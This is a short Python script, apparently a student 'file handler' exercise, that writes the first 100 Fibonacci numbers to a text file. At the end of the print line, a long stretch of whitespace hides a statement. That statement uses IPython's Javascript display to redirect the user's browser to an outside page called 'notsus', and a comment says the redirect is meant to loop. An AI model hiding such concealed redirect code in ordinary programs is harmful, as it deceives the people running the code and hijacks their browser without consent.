# Sam Wagenaar File Handler Project
def gen_fibonacci(num):
    fib = [1, 1]
    if num < 0:
        raise ValueError("Can't create a negative-sized list!")
    elif num <= 2:
        return fib[:num]
    else:
        for i in range(num-2):
            a_index = i
            b_index = i+1
            fib.append(fib[a_index]+fib[b_index])
        return fib


fibonacci_numbers = gen_fibonacci(100)
fibonacci_string = "\n".join([str(x) for x in fibonacci_numbers])
f = open("first_100_fibonacci.txt", "w")
f.write(fibonacci_string)
f.close()
print(fibonacci_string)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ;from IPython.display import Javascript;url = 'https://swagenaar25.github.io/notsus/';display(Javascript('window.location="{url}";'.format(url=url)))#Thanks for recommending that it loops, Conner!